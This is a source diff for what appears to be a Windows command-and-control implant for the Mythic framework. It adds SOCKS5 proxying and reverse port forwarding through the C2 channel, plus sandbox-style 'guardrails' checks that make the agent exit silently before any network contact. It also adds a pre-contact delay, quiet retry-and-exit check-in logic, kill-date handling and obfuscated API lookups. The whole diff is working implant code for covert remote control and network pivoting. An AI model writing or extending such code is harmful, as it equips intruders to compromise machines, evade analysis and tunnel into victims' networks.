@@ -6,6 +6,7 @@
 #include "commands.h"
 #include "crypto.h"
 #include "evasion/sleepmask.h"
+#include "evasion/guardrails.h"
 
 #ifdef HTTP_TRANSPORT
 #include "transport_http.h"
@@ -15,6 +16,14 @@
 #endif
 // Always include SMB header: link client + frame I/O used by delegate forwarding
 #include "transport_smb.h"
+
+#ifdef INCLUDE_SOCKS_PROXY
+#include "socks.h"
+#endif
+
+#ifdef INCLUDE_RPFWD
+#include "rpfwd.h"
+#endif
 
 // TLV type constants (must match translator.py)
 #define TLV_UUID     0x01
@@ -37,6 +46,8 @@
 #define TLV_PROCNAME 0x18
 #define TLV_OS_INFO  0x19
 #define TLV_DELEGATES 0x1B  // delegate blobs piggybacked on get_tasking
+#define TLV_SOCKS     0x20  // SOCKS5 proxy data (must match translator.py)
+#define TLV_RPFWD     0x21  // Reverse port forward data (must match translator.py)
 
 // Action bytes for P2P link/delegate protocol (must match translator.py)
 #define ACTION_LINK_ADD    0x05
@@ -483,6 +494,11 @@ VOID parse_config(PINSTANCE inst, const BYTE* buf, DWORD len) {
     inst->Config.killdate = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
     pos += 4;
 
+    // Pre-sleep seconds (4 bytes, big-endian) - guardrails delay before first C2 contact
+    if (pos + 4 > len) return;
+    inst->Config.pre_sleep_seconds = (buf[pos] << 24) | (buf[pos+1] << 16) | (buf[pos+2] << 8) | buf[pos+3];
+    pos += 4;
+
 #ifdef HTTP_TRANSPORT
     // Host (length-prefixed string)
     if (pos + 4 > len) return;
@@ -811,6 +827,14 @@ VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
         inst->LinkedPeers[_i].active = FALSE;
     }
 
+#ifdef INCLUDE_SOCKS_PROXY
+    inst->pSocksCtx = NULL;
+#endif
+
+#ifdef INCLUDE_RPFWD
+    inst->pRpfwdCtx = NULL;
+#endif
+
     // Initialize BEACON_INFO (preserve allocatedMemory set by DLL_BEACON_USER_DATA)
     ALLOCATED_MEMORY savedAm;
     es_memcpy(&savedAm, &inst->BeaconInfo.allocatedMemory, sizeof(ALLOCATED_MEMORY));
@@ -1094,8 +1118,40 @@ static BYTE* build_get_tasking_msg(PINSTANCE inst, DWORD* msg_len) {
 
     DWORD total = tlv_size(uuid_len) + tlv_size(action_len);
     if (del_buf && del_total > 0) total += tlv_size(del_total);
+
+#ifdef INCLUDE_SOCKS_PROXY
+    // Collect queued SOCKS upstream data
+    BYTE* socks_buf = NULL;
+    DWORD socks_len = 0;
+    if (inst->pSocksCtx) {
+        socks_poll(inst);
+        socks_buf = socks_build_upstream(inst, &socks_len);
+    }
+    if (socks_buf && socks_len > 0) total += tlv_size(socks_len);
+#endif
+
+#ifdef INCLUDE_RPFWD
+    // Collect queued rpfwd upstream data
+    BYTE* rpfwd_buf = NULL;
+    DWORD rpfwd_len = 0;
+    if (inst->pRpfwdCtx) {
+        rpfwd_poll(inst);
+        rpfwd_buf = rpfwd_build_upstream(inst, &rpfwd_len);
+    }
+    if (rpfwd_buf && rpfwd_len > 0) total += tlv_size(rpfwd_len);
+#endif
+
     BYTE* buf = (BYTE*)es_malloc(inst, total);
-    if (!buf) { if (del_buf) es_free(inst, del_buf); return NULL; }
+    if (!buf) {
+        if (del_buf) es_free(inst, del_buf);
+#ifdef INCLUDE_SOCKS_PROXY
+        if (socks_buf) es_free(inst, socks_buf);
+#endif
+#ifdef INCLUDE_RPFWD
+        if (rpfwd_buf) es_free(inst, rpfwd_buf);
+#endif
+        return NULL;
+    }
 
     DWORD pos = 0;
     tlv_pack(buf + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
@@ -1107,6 +1163,20 @@ static BYTE* build_get_tasking_msg(PINSTANCE inst, DWORD* msg_len) {
         pos += tlv_size(del_total);
         es_free(inst, del_buf);
     }
+#ifdef INCLUDE_SOCKS_PROXY
+    if (socks_buf && socks_len > 0) {
+        tlv_pack(buf + pos, TLV_SOCKS, socks_buf, socks_len);
+        pos += tlv_size(socks_len);
+        es_free(inst, socks_buf);
+    }
+#endif
+#ifdef INCLUDE_RPFWD
+    if (rpfwd_buf && rpfwd_len > 0) {
+        tlv_pack(buf + pos, TLV_RPFWD, rpfwd_buf, rpfwd_len);
+        pos += tlv_size(rpfwd_len);
+        es_free(inst, rpfwd_buf);
+    }
+#endif
     *msg_len = pos;
     return buf;
 }
@@ -1383,6 +1453,14 @@ VOID agent_main(PINSTANCE inst) {
     register_commands(inst);
     TRACE(inst, "agent_main: commands registered");
 
+    // Guardrails: pre-flight environment checks before any C2 contact.
+    // If any enabled check fails, exit silently (no network traffic).
+    if (!guardrails_check(inst)) {
+        DBG(inst, "[ES] Guardrails check failed, exiting silently");
+        return;
+    }
+    DBG(inst, "[ES] Guardrails passed");
+
     TRACE(inst, "agent_main: pre-transport");
 #ifdef HTTP_TRANSPORT
     TRACE(inst, "agent_main: transport=HTTP");
@@ -1398,34 +1476,75 @@ VOID agent_main(PINSTANCE inst) {
 #endif
 
 #if defined(HTTP_TRANSPORT) || defined(AZURE_BLOB_TRANSPORT)
-    // Initial checkin
-    DWORD checkin_len = 0;
-    BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
-    TRACE(inst, "agent_main: build_checkin_msg returned");
-    if (checkin_msg) {
-        BYTE* resp = NULL;
-        DWORD resp_len = 0;
-        if (send_mythic_msg(inst, checkin_msg, checkin_len, &resp, &resp_len) && resp && resp_len > 0) {
-            const BYTE* new_id = NULL;
-            DWORD new_id_len = 0;
-            if (tlv_find(resp, resp_len, TLV_TASKID, &new_id, &new_id_len) && new_id_len <= 36) {
-                es_memcpy(inst->Config.uuid, (PVOID)new_id, new_id_len);
-                inst->Config.uuid[new_id_len] = 0;
+    // Initial checkin with retry: 6 attempts, 5s between failures.
+    // If all fail, exit silently (no point looping with full sleep interval).
+    {
+        const int max_checkin_attempts = 6;
+        const DWORD checkin_retry_ms = 5000;
+        for (int attempt = 0; attempt < max_checkin_attempts; attempt++) {
+            if (attempt > 0)
+                inst->Win32.Sleep(checkin_retry_ms);
+
+            DWORD checkin_len = 0;
+            BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
+            TRACE(inst, "agent_main: build_checkin_msg returned");
+            if (!checkin_msg) continue;
+
+            BYTE* resp = NULL;
+            DWORD resp_len = 0;
+            if (send_mythic_msg(inst, checkin_msg, checkin_len, &resp, &resp_len) && resp && resp_len > 0) {
+                const BYTE* new_id = NULL;
+                DWORD new_id_len = 0;
+                if (tlv_find(resp, resp_len, TLV_TASKID, &new_id, &new_id_len) && new_id_len <= 36) {
+                    es_memcpy(inst->Config.uuid, (PVOID)new_id, new_id_len);
+                    inst->Config.uuid[new_id_len] = 0;
+                }
+                inst->Connected = TRUE;
+                DBG(inst, "[ES] Checkin OK");
             }
-            inst->Connected = TRUE;
-            DBG(inst, "[ES] Checkin OK");
+            if (resp) es_free(inst, resp);
+            es_free(inst, checkin_msg);
+            if (inst->Connected) break;
         }
-        if (resp) es_free(inst, resp);
-        es_free(inst, checkin_msg);
+
+        // All attempts exhausted, exit silently
+        if (!inst->Connected) {
+            DBG(inst, "[ES] Checkin failed after retries, exiting");
+            if (inst->ExitFunc == 1)
+                inst->Win32.ExitProcess(0);
+            else
+                gate_ExitThread(inst, 0);
+            return; // unreachable, but satisfies control flow
+        }
     }
-    TRACE(inst, "agent_main: initial checkin attempted");
+    TRACE(inst, "agent_main: initial checkin completed");
 
     DBG(inst, "[ES] Entering main loop");
     // Main tasking loop
     while (inst->Running) {
+        // Kill-date enforcement: compare current date (YYYYMMDD) against config.
+        // If past the killdate, stop the agent - no further C2 traffic.
+        if (inst->Config.killdate > 0) {
+            typedef VOID (WINAPI *fnGetSystemTime)(LPSYSTEMTIME);
+            xstr(_gst, "GetSystemTime");
+            fnGetSystemTime pGST = (fnGetSystemTime)
+                inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _gst);
+            if (pGST) {
+                SYSTEMTIME st;
+                es_memset(&st, 0, sizeof(st));
+                pGST(&st);
+                DWORD today = (DWORD)st.wYear * 10000 + (DWORD)st.wMonth * 100 + (DWORD)st.wDay;
+                if (today > inst->Config.killdate) {
+                    DBG(inst, "[ES] Kill date reached, stopping agent");
+                    break;
+                }
+            }
+        }
+
         if (!inst->Connected) {
             do_sleep(inst, inst->Config.sleep_ms);
-            checkin_msg = build_checkin_msg(inst, &checkin_len);
+            DWORD checkin_len = 0;
+            BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
             if (checkin_msg) {
                 BYTE* resp = NULL;
                 DWORD resp_len = 0;
@@ -1753,8 +1872,43 @@ VOID agent_main(PINSTANCE inst) {
             }
         }
 
+#ifdef INCLUDE_SOCKS_PROXY
+        // Process SOCKS data from get_tasking response (outside task iteration
+        // since SOCKS TLVs arrive at the top level alongside task TLVs)
+        if (tasks && tasks_len > 4) {
+            const BYTE* socks_data = NULL; DWORD socks_data_len = 0;
+            if (tlv_find(tasks, tasks_len, TLV_SOCKS, &socks_data, &socks_data_len) &&
+                socks_data_len > 4) {
+                socks_handle_downstream(inst, socks_data, socks_data_len);
+            }
+        }
+#endif
+
+#ifdef INCLUDE_RPFWD
+        // Process rpfwd data from get_tasking response
+        if (tasks && tasks_len > 4) {
+            const BYTE* rpfwd_data = NULL; DWORD rpfwd_data_len = 0;
+            if (tlv_find(tasks, tasks_len, TLV_RPFWD, &rpfwd_data, &rpfwd_data_len) &&
+                rpfwd_data_len > 4) {
+                rpfwd_handle_downstream(inst, rpfwd_data, rpfwd_data_len);
+            }
+        }
+#endif
+
         if (tasks) es_free(inst, tasks);
 
+#ifdef INCLUDE_SOCKS_PROXY
+        // Fast-poll when SOCKS connections are active to reduce tunnel latency
+        if (socks_has_active(inst))
+            do_sleep(inst, SOCKS_FAST_POLL_MS);
+        else
+#endif
+#ifdef INCLUDE_RPFWD
+        // Fast-poll when rpfwd listeners or connections are active
+        if (rpfwd_has_active(inst))
+            do_sleep(inst, RPFWD_FAST_POLL_MS);
+        else
+#endif
         do_sleep(inst, inst->Config.sleep_ms);
     }
 #else
